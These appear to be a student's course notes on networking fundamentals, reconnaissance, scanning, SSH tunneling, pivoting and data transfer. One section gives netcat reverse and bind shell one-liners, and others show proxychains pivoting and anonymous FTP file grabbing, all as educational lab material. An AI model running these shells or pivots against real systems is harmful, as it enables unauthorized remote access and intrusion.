==================================== FUNDEMENTALS ====================================

bits
1     bit
4     nibble
8     byte
16    half word
32    word
64    long word

BASE (N) FORMATS
Common Formats

Base 2 - 01000010 01100001 01110011 01100101 00100000 00110010
Base 10 - 66 97 115 101 32 49 48
Base 16 - 42 61 73 65 20 31 36
Base 64 - QmFzZSA2NA==

can use tools for any conversion related needs like the programming mode calculator built into the workstation

Encapsulation and Decapsulation

Layer 4 - TCP Segment
Layer 3 - IP Packet
Layer 2 - Ethernet Frame
Layer 1 - Bits

PHYSICAL LAYER
OSI LAYER 1

RESPONSIBILITIES

Hardware Specifications
Encoding and Signaling
Data Transmission and Reception
Physical Network Design


DATA LINK LAYER
OSI LAYER 2

DATA LINK SUB-LAYERS

MAC (Media Access Control)
LLC (Logical Link Control)

ETHERNET HEADER
Dest. Mac = 6 bytes |
Src. Mac  = 6 bytes | - Mac Header/Trailer
Ethertype = 2 bytes |

Payload/Data/SDU = 46-1500 Bytes

CRC/FCS = 4 Bytes

802.1Q HEADER - adds a VLAN TAG between the Src. Mac and the Ethertype that is 4 bytes

ARP HEADER - downloaded image

Ethertypes
0x0800  IPv4
0x0806  ARP
0x86DD  IPv6
0x8100  VLAN TAG


NETWORK LAYER
OSI LAYER 3

IPv4, IPv6, and ICMP downloaded image

TTL values can show what OS a packet was generated from 64 being Linux, 128 being windows, and 255 being cisco routers

Fragmentation (IPv4) splits large amounts of data into multiple packets in order to send it all, turning on the fragmentation offset and and more fragments bit until the last packet which just has an offset

ZERO CONFIGURATION (what happens to something that isnt configured)
IPv4 Auto Configuration
* APIPA
* RFC 3927

IPv6 auto configuration
* SLAAC (StateLess Address Auto-configuration)
* RFC 4862

TRANSPORT LAYER
OSI LAYER 4

TCP and UDP header downloaded
(for tcp flags read like trying to read binary from left to right)

TCP uses 3-way handshake to establish connection sending a SYN receiving a SYN/ACK then responding with an ACK then tears down with two sets sent by both machines of FIN/ACK followed by ACK

SESSION LAYER
OSI LAYER 5

PROTOCOLS
SOCKS
NetBIOS
PPTP/L2TP
RPC

SOCKS 4/5 (TCP 1080)
Uses various Client / Server exchange messages
Client can provide authentication to server
Client can request connections from server

PPTP (TCP 1723)

L2TP (TCP 1701)

SMB/CIFS (TCP 139/445 AND UDP 137/138)
SMB Rides over Netbios
Netbios Dgram Service - UDP 138
Netbios Session Service - TCP 139
SAMBA and CIFS are just flavors of SMB

RPC (ANY PORT)
RPC is a request/response protocol.
User application will:
Sends a request for information to a external server
Receives the information from the external server
Display collected data to User

PRESENTATION LAYER
OSI LAYER 6

RESPONSIBILITIES
Translation
Formating
Encoding (ASCII, EBCDIC, HEX, BASE64)
Encryption (Symmetric or Asymmetric)
Compression

APPLICATION LAYER
OSI LAYER 7

FTP (TCP 20/21)
Messages:
FTP Commands
FTP Reply Codes
Modes:
Active (default)
Passive

FTP ACTIVE ISSUES
NAT and Firewall traversal issues
Complications with tunneling through SSH
Passive FTP solves issues related to Active mode and is most often used in modern systems

SSH (TCP 22)
Messages provide:
Client/server authentication
Asymmetric or PKI for key exchange
Symmetric for session
User authentication
Data stream channeling

SSH ARCHITECTURE 1
Server
Client
Session
Keys
User Key - Asymmetric public key used to identify the user to the server
Host Key - Asymmetric public key used to identify the server to the user
Session Key - Symmetric key created by the client

SSH ARCHITECTURE 2
Known-Hosts Database - collection of host keys that the client and server use for mutual authentication.
Agent - Stores keys as a convenience for users (prevents constant passphrase entry prompt)
Signer - signs the host-based authentication packets
Random Seed - used for entropy in creating pseudo-random numbers
Configuration File - settings that exist on the client and server to dictate configuration of ssh and sshd respectively

SSH IMPLEMENTATION CONCERNS
Using password authentication only
Key rotation
Key management
Implementation specification (libssh, sshtrangerthings)

TELNET (TCP 23)
Messages:
Telnet Commands
Telnet options

SMTP (TCP 25)
Messages:
SMTP Commands
SMTP Responses

TACACS (TCP 49) SIMPLE/EXTENDED (control logons)

HTTP(S) (TCP 80/443)
Messages:
Methods
GET / HEAD / POST / PUT
HTTP status Codes
100, 200, 300, 400

POP (TCP 110)
Messages:
POP Commands
POP Replies
POP Capabilities

IMAP (TCP 143)
Messages:
IMAP Commands
IMAP Status Response
IMAP Capabilities

RDP (TCP 3389)
Compression or Encryption support
Desktop size and color depth
Keyboard Mapping
Remote system control
Mouse-cursor color properties.

DNS (QUERY/RESPONSE) (TCP/UDP 53)

DHCP (UDP 67/68)

TFTP (UDP 69)
Messages:
TFTP Opcodes
TFTP Error Codes

NTP (UDP 123)

RADIUS (UDP 1645/1646 AND 1812/1813)

RTP (UDP ANY ABOVE 1023)

SNMP (UDP 161/162)
snmp
7 Message Types

Get Request
Set Request
Get Next
Get Bulk
Response
Trap
Inform

CAPTURE LIBRARY
What makes traffic capture possible?
Libpcap
WinPcap
NPCAP

WIRESHARK, TSHARK, TCPDUMP AND BPFS

BERKELEY PACKET FILTERS (BPF)
Requests a SOCK_RAW socket and setsockopt calls SO_ATTACH_FILTER
sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))
...
setsockopt(sock, SOL_SOCKET, SO_ATTACH_FILTER, ...)

BERKELEY PACKET FILTERS
Using BPFs with operators, bitmasking, and TCPDump creates a powerful tool for traffic filtering and parsing.

tcpdump {A} [B:C] {D} {E} {F} {G}

A = Protocol (ether | arp | ip | ip6 | icmp | tcp | udp)
B = Header Byte offset
C = optional: Byte Length. Can be 1, 2 or 4 (default 1)
D = optional: Bitwise mask (&)
E = Operator (= | == | > | < | <= | >= | != | () | << | >>)
F = Result of Expresion
G = optional: Logical Operator (&& ||) to bridge expressions
w = write to a given fileExample:
tcpdump 'ether[12:2] = 0x0800 && (tcp[2:2] != 22 && tcp[2:2] != 23)'

BITWISE MASKING
To filter down to the bit(s) and not just the byte.
ip[0] & 0x0F > 0x05

FILTER LOGIC - MOST EXCLUSIVE
All designated bit values must be set; no others can be set
tcp[13] = 0x11
--or--
tcp[13] & 0xFF = 0x11

FILTER LOGIC - LESS EXCLUSIVE
All designated bits must be set; all others may be see
tcp[13] & 0x11 = 0x11

FILTER LOGIC - LEAST EXCLUSIVE
At least one of the designated bits must be set to not equal 0; all others may be set
tcp[13] & 0x11 !=0

LAYER 2 SWITCHING TECHNOLOGIES

SWITCH OPERATION
Fast Forward - Only Destination MAC
Fragment Free - First 64 bytes
Store and Forward - Entire Frame and FCS

CAM TABLE
Learn - Examining the Source MAC Address
Forward - Examining the Destination MAC Address

VLANS AND IEEE 802.1Q

IEEE 802.1AD "Q-IN-Q"

SPANNING TREE PROTOCOL (STP)
Root decision process
1. Elect root Bridge
2. Identify the Root ports on non-root bridge
3. Identify the Designated port for each segment
4. Set alternate ports to blocking state

LAYER 2 DISCOVERY PROTOCOLS
Cisco Discovery Protocol (CDP)
Foundry Discovery Protocol (FDP)
Link Layer Discovery Protocol(LLDP)

DTP (DYNAMIC TRUNKING PROTOCOL)

VTP (VLAN TRUNKING PROTOCOL)

PORT SECURITY
Modes
shutdown
restrict
protect

LAYER 3 ROUTING TECHNOLOGIES

routers contain routing tables based off of networks that connect switches to each other

METRICS
Hop
Bandwidth
Delay
Load
MTU
Reliability
Cost
Policy

routing protocols are used to learn and advertise routeing tables while routed protocols are how user traffic is passed around

administrative distance defines the importance of data being passed to the router

================================= PROGRAMMING =======================================

PACKET CREATION AND SOCKET PROGRAMMING

SOCKET TYPES
Stream Sockets - Connection oriented and sequenced; methods for connection establishment and tear-down. Used with TCP, SCTP, and Bluetooth.
Datagram Sockets - Connectionless; designed for quickly sending and receiving data. Used with UDP.
Raw Sockets - Direct sending and receiving of IP packets without automatic protocol-specific formatting.

USER SPACE VS. KERNEL SPACE SOCKETS
User Space Sockets
Stream Sockets
Datagram Sockets
Kernel Space Sockets
Raw Sockets

SOCKET CREATION AND PRIVILEGE LEVEL
User Space Sockets - The most common sockets that do not require elevated privileges to perform actions on behalf of user applications.
Kernel Space Sockets - Attempts to access hardware directly on behalf of a user application to either prevent encapsulation/decapsulation or to create packets from scratch, which requires elevated privileges.

USER SPACE APPLICATIONS/SOCKETS
Using tcpdump or wireshark to read a file
Using nmap with no switches
Using netcat to connect to a listener
Using netcat to create a listener above the well known port range(1024+)
Using /dev/tcp or /dev/udp to transmit data

KERNEL SPACE APPLICATIONS/SOCKETS
Using tcpdump or wireshark to capture packets on the wire
Using nmap for OS identification or to set specific flags when scanning
Using netcat to create a listener in the well known port range (0 - 1023)
Using Scapy to craft or modify a packet for transmission

UNDERSTANDING PYTHON TERMINOLOGY
Libraries
Modules
Functions
Exceptions
Constants
Objects
Types

NETWORK PROGRAMMING WITH PYTHON3
Network sockets primarily use the Python3 Socket library and socket.socket function.
import socket
  s = socket.socket(socket.FAMILY, socket.TYPE, socket.PROTOCOL)

THE SOCKET.SOCKET FUNCTION
Inside the socket.socket. function, you have these arguments, in order:
socket.socket([*family*[,*type*[*proto*]]])
family constants should be: AF_INET (default), AF_INET6, AF_UNIX
type constants should be: SOCK_STREAM (default), SOCK_DGRAM, SOCK_RAW
proto constants should be: 0 (default), IPPROTO_RAW

RAW IPV4 SOCKETS
Raw Socket scripts must include the IP header and the next headers.
Requires guidance from the "Request for Comments" (RFC)to follow header structure properly.
RFCs contain technical and organizational documents about the Internet, including specifications and policy documents.
See RFC 791, Section 3 - Specification for details on how to construct an IPv4 header.

RAW SOCKET USE CASE
Testing specific defense mechanisms - such as triggering and IDS for an effect, or filtering
Avoiding defense mechanisms
Obfuscating data during transfer
Manually crafting a packet with the chosen data in header fields

ENCODING AND DECODING
Encoding
The process of taking bits and converting them using a specified cipher.

Decoding
Reverse of the conversion process used by the specified cipher for encoding.
Common encoding schemes
UTF-8, Base64, Hex

========================== NETWORK RECONAISSANCE ===============================================

RECONNAISSANCE
Active
Passive
Internal
External

PASSIVE RECONNAISSANCE
Gathering information about targets without direct interaction
Not as straight forward and requires more time than active reconnaissance
Lower risk of discovery

PASSIVE RECONNAISSANCE
Involves identifying:
IP addresses and Sub-Domains
External and 3rd party sites
People and Technologies
Content of Interest
Vulnerabilities

PASSIVE RECONNAISSANCE
Possible tools for gathering:
WHOIS queries
Job site listings
Phone Numbers
Google searches
Passive OS fingerprinting

PASSIVE EXTERNAL NETWORK RECONNAISSANCE
Information gathered outside of the network using passive methods
Allows for more efficient attacks and plans

PASSIVE EXTERNAL NETWORK RECONNAISSANCE: DNS
Resolves hostnames to IP addresses
RFC 3912
WHOIS queries

PASSIVE EXTERNAL NETWORK RECONNAISSANCE: DIG
Typically between primary and secondary DNS servers
If allowed to transfer externally hostnames, IPs, and IP blocks can be determined

PASSIVE EXTERNAL NETWORK RECONNAISSANCE: ZONE TRANSFERS
Returns DNS information
Supplements base queries

PASSIVE EXTERNAL NETWORK RECONNAISSANCE: HOST HISTORY
netcraft
wayback machine

PASSIVE EXTERNAL NETWORK RECONNAISSANCE: GOOGLE SEARCHES
subdomains
technologies

PASSIVE EXTERNAL NETWORK RECONNAISSANCE: SHODAN
Reveals information about technologies, remote access services, improperly configured services, and network infrastructure.
When selected can give additional information and applicable vulnerabilities

NETWORK SCANNING
Scanning Strategy
Remote to Local
Local to Remote
Local to Local
Remote to Remote

NETWORK SCANNING
Scanning Approach
Aim
Wide range target scan
Target specific scan
Method
Single source scan
Distributed scan

NETWORK SCANNING
Broadcast Ping and Ping sweep
ARP scan
SYN scan
Full connect scan
Null scan
FIN scan
XMAS tree scan
UDP scan

NETWORK SCANNING
ACK/Window scan
RPC scan
FTP scan
decoy scan
OS fingerprinting scan
version scan
Protocol ping
Discovery probes

NETWORK SCANNING - CODE
Example Syntax
nmap [Options] [Target IP/ Subnet]
nc [Options] [Target IP] [Target Port]

============================= NETWORK MAPPING ==========================================

ARP is not reliable to use for enumerating networks but ip a can be used to find other arp info on boxes you ssh into
ssh into the router and view the config to begin enumeration
once in the router use show int and show config to view interfaces and router configs
use nmap <target ip> -Pn -p 21-25,80 to look at important ports for this class (can use -T5 to make it go faster if need be)
can use anonymous ftp login to look at files on a box with that port open (doesnt always work)
wget can be used when the http port is open like wget -r(grabs every file and putsit in a new directory on your machine) <target ip> which can be switched to ftp by doing wget ftp://<target ip> or <target ip>:<target port>(21 in this case)
can use screenshot tool to crop out screenshots and paste them to your draw.io
ssh can be used if you can get the credentials to get on the box for easy enumeration
netcat can be used to banner grab with nc <target port> <ports to check> to look for sneaky hidden ports (basically they give ports fake names)
even if you dont have all the details write down the information you do know for hosts
can ssh to other ports using ssh <user>@<target ip> -p <port>
once on a machine try to find out everything you can about said box like using the find command or hostname
scp can be used to grab files from boxes and take them to your system by
if the telnet banner is grabbed and shows weid symbols test out telnet to see if it works with telnet <target ip>
if you banner grab an http on port 80 or whatever and it just sits there use the GET command to see if it responds with http info
read pngs or jpgs using eom or eog
./scan.sh can be used to do a netcat scan of a buncha ports
ss -ntlp can be used to view open ports on a box
dig <record type> @<dns server> <optional zonetransfer.me if needed for zone transfer info>
use nmap <ip range> -Pn to ping sweep a networks range
for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done cli-ninja-ping-sweep
ip n shows the directly connected neighbors to a device

============================== DATA TRANSFER, MOVEMENT, and REDIRECTION ==================================

DESCRIBE COMMON METHODS FOR TRANSFERRING DATA
TFTP
FTP
Active
Passive
SFTP
SCP

TFTP
Trivial File Transfer Protocol
RFC 1350 Rev2
UDP transport
Extremely small and very simple communication
No terminal communication ()
Insecure (no authentication or encryption)
No directory services
Used often for technologies such as BOOTP and PXE

FTP
File Transfer Protocol
RFC 959
TCP transport
Uses multiple TCP connections
Control Connection (21) / Data Connection (20)
Authentication through clear-text sign in (username and password)
Insecure in default configuration
Has directory services

SFTP
Secure File Transfer Protocol
TCP transport (TCP port 22)
Uses symmetric and asymmetric encryption
Adds FTP like services to SSH
Authentication through sign in (username and password) or with SSH key
Interactive terminal access

FTPS
File Transfer Protocol Secure
TCP transport (TCP port 443)
Adds SSL/TLS encryption to FTP
Authentication with username/password and/or PKI
Interactive terminal access

SCP
Secure Copy Protocol
TCP Transport (TCP port 22)
Uses symmetric and asymmetric encryption
Authentication through sign in (username and password) or with SSH key
Non Interactive can use -r to copy whole diretories

SCP SYNTAX
Download a file from a remote directory to a local directory
$ scp student@172.16.82.106:secretstuff.txt /home/student
Upload a file to a remote directory from a local directory
$ scp secretstuff.txt student@172.16.82.106:/home/student
Copy a file from a remote host to a separate remote host
$ scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student

SCP SYNTAX W/ ALTERNATE SSHD
Download a file from a remote directory to a local directory
$ scp -P 1111 student@172.16.82.106:secretstuff.txt /home/student
Upload a file to a remote directory from a local directory
$ scp -P 1111 secretstuff.txt student@172.16.82.106:/home/student

SCP SYNTAX THROUGH A TUNNEL
ssh student@172.16.82.106 -L 1111:localhost:22 -NT
Download a file from a remote directory to a local directory
$ scp -P 1111 student@localhost:secretstuff.txt /home/student
Upload a file to a remote directory from a local directory
$ scp -P 1111 secretstuff.txt student@localhost:/home/student

------------------------------------ TRAFFIC REDIRECTION USING TOOLS ----------------------------------------

NETCAT
NETCAT is the "swiss army knife" networking utility which reads and writes data across network socket connections using the TCP/IP protocol. It is designed to be a reliable "back end" tool that can be used directly or easily driven by other programs and scripts.
Can be used for the following:
inbound and outbound connections, TCP/UDP, to or from any ports
troubleshooting network connections
sending/receiving data (insecurely)TION USING TOOLS

NETCAT: CLIENT TO LISTENER FILE TRANSFER
Client (sends file): nc 10.2.0.2 9001 < file.txt
Listener (receive file): nc -l -p 9001 > newfile.txt

NETCAT: LISTENER TO CLIENT FILE TRANSFER
Listener (sends file): nc -l -p 9001 < file.txt
Client (receive file): nc 10.2.0.2 9001 > newfile.txt

==NETCAT RELAY DEMOS==
On Client Relay:

mknod mypipe p
nc 10.1.0.2 9002 0< mypipe | nc 10.2.0.2 9001 1> mypipe
On Listener2 (sends info):

nc -l -p 9002 < infile.txt
On Listener1 (receives info):

nc -l -p 9001 > outfile.txt
==Writes the output to listener1 and listener2 through the named pipe==

DESCRIBE COMMON METHODS FOR TRANSFERRING DATA
TFTP
FTP
Active
Passive
SFTP
SCP

REVERSE SHELL USING NETCAT
When shelled into the remote host using -c :
nc -c /bin/sh <your ip> <any unfiltered port>
You could even pipe BASH through NETCAT.
/bin/sh | nc <your ip> <any unfiltered port>
Then listen for the shell.
nc -l -p <same unfiltered port> -vvv
You can also listen using the -e with NETCAT.
nc -l -p <any unfiltered port> -e /bin/bash

----------------------- NETWORK TUNNELING ------------------------

SSH
Various Implementations (v1 and v2)
Provides authentication, encryption, and integrity.
Allows remote terminal sessions
Used for tunneling
Created as a secure replacement for Berkeley Remote commands:
rsh - replaced with ssh, provides a channel for running a shell on a remote computer.
rlogin - replaced with rlogin, provides remote login capability.
rcp - replaced with scp for secure file transfer
sftp (not a unix r command replacement) - creates remote directory listing and file transfer capability over SSH

SSH PORT FORWARDING
Creates channels using SSH-CONN protocol
Allows for tunneling of other services through SSH
Provides insecure services encryption

SSH LOCAL PORT FORWARDING
Syntax
ssh -p <optional alt port> <user>@<pivot ip> -L <local bind port>:<tgt ip>:<tgt port> -NT
or
ssh -L <local bind port>:<tgt ip>:<tgt port> -p <alt port> <user>@<pivot ip> -NT

SSH LOCAL PORT FORWARDING
Creates a local port (1111) on the local host that forwards to a target machine’s port 80.
ssh student@172.16.82.106 -L 1111:localhost:80 -NT
or
ssh -L 1111:localhost:80 student@172.16.82.106 -NT

SSH LOCAL PORT FORWARDING THROUGH A LOCAL PORT
Internet Host:
ssh student@172.16.1.15 -L 1111:172.16.40.10:22 -NT
ssh student@localhost -p 1111 -L 2222:172.16.82.106:80 -NT
firefox localhost:2222
Creates an additional local port on the local host that forwards to a target machine through the previous channel created.

SSH DYNAMIC PORT FORWARDING
Syntax
ssh -D <port> -p <alt port> <user>@<pivot ip> -NT
Proxychains default port is 9050
Creates a dynamic socks4 proxy that interacts alone, or with a previously established remote or local port forward.
Allows the use of scripts and other userspace programs through the tunnel

SSH DYNAMIC PORT FORWARDING 1-STEP
Blue Private Host-1:
ssh student@172.16.82.106 -D 9050 -NT
proxychains ./scan.sh
proxychains ssh student@10.10.0.40

SSH DYNAMIC PORT FORWARDING 2-STEP
Blue Private Host-1:
ssh student@172.16.82.106 -L 1111:10.10.0.40:22 -NT
ssh student@localhost -D 9050 -p 1111 -NT
proxychains curl ftp://www.onlineftp.ch
proxychains wget -r www.espn.com
proxychains ./scan.sh
proxychains ssh student@172.16.101.2

SSH REMOTE PORT FORWARDING
Syntax
ssh -p <optional alt port> <user>@<remote ip> -R <remote bind port>:<tgt ip>:<tgt port> -NT
or
ssh -R <remote bind port>:<tgt ip>:<tgt port> -p <alt port> <user>@<remote ip> -NT

SSH REMOTE PORT FORWARDING
Blue Host-1
ssh student@10.10.0.40 -R 1111:localhost:80 -NT
Creates a remote port on the remote’s local host that forwards to the target specified.

SSH REMOTE AND LOCAL PORT FORWARDING
Blue Private Host-1:
ssh student@172.16.82.106 -R 1111:localhost:22 -NT
Internet Host:
ssh student@172.16.82.106 -L 2222:localhost:1111 -NT
Internet Host:
ssh localhost -p 2222
Creates a remote port on a remote machine, staging a connection.
Also creates a local port on the localhost to connect to the previously staged connection.
Login to extra1 via the net1 local port forward

COVERT CHANNEL
A Covert Channel is a method of creating a capability to transfer information objects between endpoints that should not be allowed based on policy.
Strategies attackers use to avoid detection:
Tunnels
ICMP
DNS
HTTP









